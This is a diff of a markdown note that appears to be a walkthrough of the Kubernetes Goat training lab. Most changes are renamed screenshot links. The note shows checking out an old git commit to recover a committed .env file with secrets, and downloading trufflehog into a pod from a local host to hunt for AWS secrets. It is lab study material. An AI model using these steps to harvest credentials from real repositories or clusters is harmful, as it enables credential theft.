@@ -1,7 +1,5 @@
 
 
-
-
 wordlist
 
 ```bash
@@ -42,15 +40,15 @@ interesting commit at `d7c173ad183c574109cd5c4c648ffe551755b576`
 git show d7c173ad183c574109cd5c4c648ffe551755b576
 ```
 
-![[Pasted image 20260815154707.png]]
+![[k8s-goat-git-logs.png]]
 
-On master therin't a `.env` file![[Pasted image 20260815161201.png]]
+On master therin't a `.env` file![[lk8s-goat-list-repo-files.png]]
 
 ```bash
 git checkout d7c173ad183c574109cd5c4c648ffe551755b576
 ```
 
-![[Pasted image 20260815161351.png]]
+![[k8s-goat-list-file-new-branch.png]]
 
 # Second method
 if we are in already in the cluser we can do the same things in the pod... or we can use **trufflehog**
@@ -68,7 +66,7 @@ in the pod
 wget -c http://192.168.1.84:8000/trufflehog
 ```
 
-![[Pasted image 20260815163506.png]]
+![[k8s-goat-aws-env-secrets.png]]
 
 
 ## Treasure
